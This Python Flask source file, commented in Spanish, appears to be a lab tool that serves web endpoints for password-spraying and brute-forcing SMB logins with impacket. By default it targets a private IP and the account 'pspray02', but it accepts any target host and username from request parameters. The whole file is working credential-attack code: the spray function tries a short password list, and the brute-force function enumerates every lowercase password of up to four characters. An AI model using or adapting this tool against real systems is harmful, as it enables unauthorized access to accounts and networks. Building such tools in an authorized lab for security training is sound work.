from flask import Flask, jsonify, request
from flask_cors import CORS
from impacket.smbconnection import SMBConnection, SessionError
import itertools

app = Flask(__name__)
CORS(app)


TARGET = "192.168.100.230"
USERNAME = "pspray02"


# ─── Función compartida de login SMB ──────────────────────────────────────────
def try_login(username, password, target):
    try:
        conn = SMBConnection(target, target, sess_port=445)
        conn.login(username, password, target)
        conn.logoff()
        return True
    except SessionError as e:
        if "STATUS_PASSWORD_MUST_CHANGE" in str(e):
            return True
        return False
    except Exception:
        return False

# ─── Password Spray ───────────────────────────────────────────────────────────
def web_spray(username, password_list, target):
    results = []
    for password in password_list:
        try:
            success = try_login(username, password, target)
            if success:
                results.append({"status": "success", "password": password})
                break
            else:
                results.append({"status": "failed", "password": password})
        except Exception as e:
            results.append({"status": "error", "message": str(e)})
            break
    return results

# ─── Fuerza Bruta ─────────────────────────────────────────────────────────────
def brute_force(username, target, max_length=4):
    # LETTERS = list('abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ')
    # LETTERS = list('abcdefghijklmnñopqrstuvwxyz')
    LETTERS = list('zyxwvutsrqponmlkjihgfedcba')
    tried = 0

    for length in range(1, max_length + 1):
        print(f"[*] Probando longitud {length}...")
        for combo in itertools.product(LETTERS, repeat=length):
            password = ''.join(combo)
            tried += 1
            if tried % 50 == 0:
                print(f"[*] Intentos: {tried} | Último: {password}")
            try:
                success = try_login(username, password, target)
                if success:
                    print(f"[+] Encontrada: {password} en {tried} intentos")
                    return [
                        {"status": "trying", "count": tried},
                        {"status": "success", "password": password}
                    ]
            except Exception as e:
                return [{"status": "error", "message": str(e)}]

    return [
        {"status": "trying", "count": tried},
        {"status": "not_found", "message": "Contraseña no encontrada"}
    ]

# ─── Rutas Flask ──────────────────────────────────────────────────────────────
@app.route('/spray', methods=['GET'])
def spray():
    ip = request.args.get('ip', TARGET)
    user = request.args.get('user', USERNAME)
    password_list = ["wrongpass", "admin123", "password", "LabPassword123!"]
    results = web_spray(user, password_list, ip)
    return jsonify(results)

@app.route('/brute', methods=['GET'])

def brute():
    ip = request.args.get('ip', TARGET)
    user = request.args.get('user', USERNAME)
    results = brute_force(user, ip, max_length=4)
    return jsonify(results)

if __name__ == '__main__':
    app.run(port=5000)
